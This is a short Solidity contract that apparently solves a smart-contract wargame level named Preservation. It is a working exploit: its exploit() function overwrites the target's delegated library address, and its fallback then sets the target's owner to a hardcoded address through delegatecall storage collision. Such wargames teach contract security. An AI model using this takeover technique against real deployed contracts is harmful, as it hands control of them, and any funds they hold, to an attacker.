// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Preservation.sol";

contract PreservationExploit {
    address public preservation; // slot
    address public slot2; // slot1
    address public owner; // slot2

    constructor(address _preservation) public {
        preservation = _preservation;
    }

    function exploit() external {
        // After execution slot0 of the preservation contract will point to us
        // So the next time we delegate call it it will come here
        Preservation(preservation).setFirstTime(uint256(address(this)));
    }

    fallback() external {
        // Delegate called from Preservation.sol, will update the owner of Preservation.sol
        owner = 0xAe42B13CF992FeB85eEEf0c8B91FDDbFe721C02c;
    }
}
